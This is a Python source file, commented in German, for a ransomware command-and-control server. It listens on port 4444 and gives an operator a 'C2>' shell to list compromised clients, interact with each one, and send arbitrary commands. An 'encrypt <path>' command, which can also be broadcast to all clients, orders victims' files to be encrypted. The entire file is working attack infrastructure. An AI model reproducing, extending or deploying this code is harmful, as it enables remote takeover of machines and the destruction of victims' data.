import socket
import threading
import subprocess
import sys
import time


# Clients Connections und IDs speichern
clients = {}
client_id = 0
lock = threading.Lock()


def handle_client(client_socket, client_address, cid):
    """Einzelne Client Verbindung verarbeiten"""
    print(f"[+] Neue Verbindung: ID {cid} from {client_address}")
    clients[cid] = client_socket

    try:
        while True:
            # Clientantworten auf befehle erhalten
            data = client_socket.recv(4096).decode("utf-8", errors="ignore")
            if not data:
                break
            print(f"[ID {cid}] Response: {data}")

    except Exception as e:
        print(f"[!] Fehler mit client ID {cid}: {e}")

    finally:
        with lock:
            del clients[cid]
        client_socket.close()
        print(f"[-] Client ID {cid} discconnected")


def broadcast_command(command):
    """Befehl an alle verbundenen Clients senden"""
    with lock:
        for cid, client_socket in clients.items():
            try:
                client_socket.send(command.encode("utf-8"))
                print(f"[+] Befehl an ID {cid} gesendet")
            except Exception as e:
                print(f"[!] Fehler beim senden an {cid}: {e}")


def send_command_to_client(cid, command):
    """Befehl an einen spezifischen Client senden"""
    with lock:
        if cid in clients:
            try:
                clients[cid].send(command.encode("utf-8"))
                print(f"[+] Befehl an ID {cid} gesendet")
            except Exception as e:
                print(f"[!] Fehler beim senden an {cid}: {e}")
        else:
            print(f"[!] Client ID {cid} konnte nicht gefunden werden")


def encrypt_target(cid, target_path):
    """Encrypt Befehl an spezifischen Client senden"""
    encrypt_command = f"encrypt {target_path}"
    send_command_to_client(cid, encrypt_command)
    print(f"[+] Encrypt Befehl für Pfad '{target_path}' an ID {cid} gesendet")


def list_sessions():
    """Alle aktive Client Sessions ausgeben"""
    with lock:
        if not clients:
            print("[!] Keine aktiven Sessions")
        else:
            print("[*] Aktive Sessions:")
            for cid in clients:
                print(f"\t ID {cid}")


def server_shell():
    """Interaktive Shell für die Befehle"""
    global client_id
    while True:
        cmd = input("C2> ").strip()
        if cmd == "sessions":
            list_sessions()
        elif cmd.startswith("interact "):
            try:
                # Versuchen die Client ID aus dem Befehl auszulesen
                cid = int(cmd.split()[1])
                if cid in clients:
                    print(
                        f"[*] Interacting with ID {cid}. Zum verlassen 'background' eingeben"
                    )
                    while True:
                        sub_cmd = input(f"ID {cid}> ").strip()
                        if sub_cmd == "background":
                            break
                        elif sub_cmd.startswith("encrypt "):
                            # Encrypt Befehl in der interaktiven Session
                            try:
                                target_path = sub_cmd.split(" ", 1)[1]
                                encrypt_target(cid, target_path)
                            except IndexError:
                                print("[!] Usage: encrypt <target_path>")
                        elif sub_cmd:
                            send_command_to_client(cid, sub_cmd)
                else:
                    print(f"[!] Client ID {cid} nicht gefunden")
            except (IndexError, ValueError):
                print("[!] Usage: interact <client_id>")
        elif cmd.startswith("encrypt "):
            # Encrypt Befehl mit Client ID
            try:
                parts = cmd.split(" ", 2)
                if len(parts) != 3:
                    print("[!] Usage: encrypt <client_id> <target_path>")
                else:
                    cid = int(parts[1])
                    target_path = parts[2]
                    encrypt_target(cid, target_path)
            except ValueError:
                print("[!] Client ID muss eine Zahl sein")
        elif cmd.startswith("broadcast "):
            command = cmd[10:].strip()
            if command:
                if command.startswith("encrypt "):
                    # Broadcast encrypt Befehl
                    try:
                        target_path = command.split(" ", 1)[1]
                        broadcast_command(f"encrypt {target_path}")
                        print(
                            f"[+] Encrypt Befehl für Pfad '{target_path}' an alle Clients gesendet"
                        )
                    except IndexError:
                        print("[!] Usage: broadcast encrypt <target_path>")
                else:
                    broadcast_command(command)
            else:
                print("[!] Usage: broadcast <command>")
        elif cmd == "help":
            print("[*] Verfügbare Befehle:")
            print("  sessions                    - Zeige alle aktiven Sessions")
            print("  interact <id>               - Interagiere mit einem Client")
            print(
                "  encrypt <id> <path>         - Verschlüssle Pfad auf spezifischem Client"
            )
            print("  broadcast <cmd>             - Sende Befehl an alle Clients")
            print("  broadcast encrypt <path>    - Verschlüssle Pfad auf allen Clients")
            print("  exit                        - Server beenden")
        elif cmd == "exit":
            with lock:
                for client_socket in clients.values():
                    client_socket.close()
            sys.exit(0)
        else:
            print(
                "[!] Commands: sessions, interact <id>, encrypt <id> <path>, broadcast <cmd>, help, exit"
            )


def main():
    """Main Server Function"""
    global client_id
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 4444))
    server.listen(5)
    print("[*] C2 Server started on port 4444")
    print(f"[*] Server IP: {socket.gethostbyname(socket.gethostname())}")

    # Server Shell in eigenem Threat starten
    threading.Thread(target=server_shell, daemon=True).start()

    try:
        while True:
            conn, addr = server.accept()
            print("Client connected from", addr)
            print("Local IP used for this connection:", conn.getsockname()[0])
            with lock:
                client_id += 1
                client_thread = threading.Thread(
                    target=handle_client,
                    args=(conn, addr, client_id),
                )
                client_thread.daemon = True
                client_thread.start()

    except KeyboardInterrupt:
        print("\n[!] Shutting down Server")
        server.close()


if __name__ == "__main__":
    main()
